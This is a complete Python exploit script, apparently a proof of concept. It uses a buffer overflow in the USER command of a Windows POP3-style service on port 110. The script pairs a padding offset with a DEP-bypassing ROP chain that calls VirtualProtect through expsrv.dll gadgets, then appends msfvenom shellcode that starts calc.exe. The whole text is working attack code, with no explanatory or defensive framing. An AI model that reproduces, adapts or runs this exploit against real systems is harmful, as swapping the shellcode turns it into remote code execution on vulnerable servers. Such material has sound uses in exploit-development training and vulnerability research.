#!/usr/bin/python3
from pwn import remote, p32, p16

# !py mona jmp -r esp -m expsrv.dll
offset = 5092
junk = b"A" * offset

"""
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,     (ESP)
  [in]  SIZE_T dwSize,        (0x1)
  [in]  DWORD  flNewProtect,  (0x40)
  [out] PDWORD lpflOldProtect (&Writable)
);
"""

rop  = b""
rop += p32(0x0f9c7c3c) # pop eax; ret;
rop += p32(0xffffffbe) # 0x0 - 0x42
rop += p32(0x0f9c6b68) # neg eax; ret;
rop += p32(0x0f9d8ac3) # xchg esi, eax; sub bh, bh; dec ecx; ret 4;
rop += p32(0x0f9a196b) # pop ebx; ret;
rop += p32(0x41414141) # padding for ret
rop += p32(0xffffffff) # 0x0 - 0x1
rop += p32(0x0f9f13df) # add ebx, esi; stc; ret;
rop += p32(0x0f9e8887) # pop edx; ret;
rop += p32(0xffffffff) # 0x0 - 0x1
rop += p32(0x0f9ec8de) # add edx, ebx; pop ebx; ret 0x10;
rop += p32(0xffffffff) # 0x0 - 0x1
rop += p32(0x0f9cccad) # inc ebx; ret 2;
rop += p32(0x41414141) # padding for ret
rop += p32(0x41414141) # padding for ret
rop += p32(0x41414141) # padding for ret
rop += p32(0x41414141) # padding for ret
rop += p32(0x0f9cccad) # inc ebx; ret 2;
rop += p16(0x4141)     # padding for ret
rop += p32(0x0f9c40b1) # pop ecx; ret;
rop += p16(0x4141)     # padding for ret
rop += p32(0x0fa10bf0) # Writable
rop += p32(0x0f9c8baf) # pop ebp; ret;
rop += p32(0x0f9c8baf) # pop ebp; ret;
rop += p32(0x0f9c34f7) # pop esi; ret;
rop += p32(0x0f9da572) # jmp dword ptr [eax];
rop += p32(0x0f9c1ee2) # pop edi; ret;
rop += p32(0x0f9c115c) # ret;
rop += p32(0x0f9c7c3c) # pop eax; ret;
rop += p32(0x0fa021cc) # VirtualProtect()
rop += p32(0x0f9f30c2) # pushad; ret;
rop += p32(0x0f9e24f9) # push esp; ret 8;

# msfvenom -p windows/exec CMD=calc.exe -f python -v shellcode -b '\x00' -e x86/jmp_call_additive
shellcode =  b""
shellcode += b"\xfc\xbb\x7b\xab\x38\xf3\xeb\x0c\x5e\x56\x31"
shellcode += b"\x1e\xad\x01\xc3\x85\xc0\x75\xf7\xc3\xe8\xef"
shellcode += b"\xff\xff\xff\x87\x43\xba\xf3\x77\x94\xdb\x7a"
shellcode += b"\x92\xa5\xdb\x19\xd7\x96\xeb\x6a\xb5\x1a\x87"
shellcode += b"\x3f\x2d\xa8\xe5\x97\x42\x19\x43\xce\x6d\x9a"
shellcode += b"\xf8\x32\xec\x18\x03\x67\xce\x21\xcc\x7a\x0f"
shellcode += b"\x65\x31\x76\x5d\x3e\x3d\x25\x71\x4b\x0b\xf6"
shellcode += b"\xfa\x07\x9d\x7e\x1f\xdf\x9c\xaf\x8e\x6b\xc7"
shellcode += b"\x6f\x31\xbf\x73\x26\x29\xdc\xbe\xf0\xc2\x16"
shellcode += b"\x34\x03\x02\x67\xb5\xa8\x6b\x47\x44\xb0\xac"
shellcode += b"\x60\xb7\xc7\xc4\x92\x4a\xd0\x13\xe8\x90\x55"
shellcode += b"\x87\x4a\x52\xcd\x63\x6a\xb7\x88\xe0\x60\x7c"
shellcode += b"\xde\xae\x64\x83\x33\xc5\x91\x08\xb2\x09\x10"
shellcode += b"\x4a\x91\x8d\x78\x08\xb8\x94\x24\xff\xc5\xc6"
shellcode += b"\x86\xa0\x63\x8d\x2b\xb4\x19\xcc\x21\x4b\xaf"
shellcode += b"\x6b\x07\x4b\xaf\x73\x38\x24\x9e\xf8\xd7\x33"
shellcode += b"\x1f\x2b\x9c\xcc\x55\x71\xb5\x44\x30\xe0\x87"
shellcode += b"\x08\xc3\xdf\xc4\x34\x40\xd5\xb4\xc2\x58\x9c"
shellcode += b"\xb1\x8f\xde\x4d\xc8\x80\x8a\x71\x7f\xa0\x9e"
shellcode += b"\x12\x1e\x32\x42\xfa\x85\xb2\xe1\x02\x46\x43"
shellcode += b"\xea\x02\x46\x43\xea"

payload = junk + rop + shellcode

shell = remote("Windows", 110)
shell.sendlineafter(b"\r\n", b"USER " + payload + b"\r")
